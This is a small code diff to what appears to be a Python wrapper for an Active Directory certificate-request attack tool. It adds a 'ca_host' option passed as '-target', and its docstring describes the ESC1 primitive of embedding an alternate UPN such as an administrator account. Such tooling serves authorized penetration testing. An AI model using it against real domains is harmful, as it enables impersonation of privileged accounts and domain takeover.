@@ -134,6 +134,7 @@ async def request(
     ca: str = "",
     template: str = "",
     upn: str = "",
+    ca_host: str = "",
     dc_ip: str = "",
     timeout_seconds: int = 300,
 ) -> dict[str, Any]:
@@ -147,6 +148,9 @@ async def request(
       template: certificate template to request (``-template``).
       upn: alternate UPN to embed (``-upn``) — the ESC1 impersonation
         primitive (e.g. ``administrator@corp.local``).
+      ca_host: the CA enrollment-server host (``-target``) — set this when
+        the CA isn't reachable/resolvable from ``-ca`` alone (the common
+        case where the CA is a separate host from the DC).
       dc_ip: DC IP.
       timeout_seconds: hard wallclock cap (default 300).
 
@@ -164,6 +168,8 @@ async def request(
     argv.extend(_auth_args(password, nthash))
     if dc_ip:
         argv.extend(["-dc-ip", dc_ip])
+    if ca_host:
+        argv.extend(["-target", ca_host])
 
     result = await run.run(argv, timeout=timeout_seconds)
     stdout = result.get("stdout", "") or ""
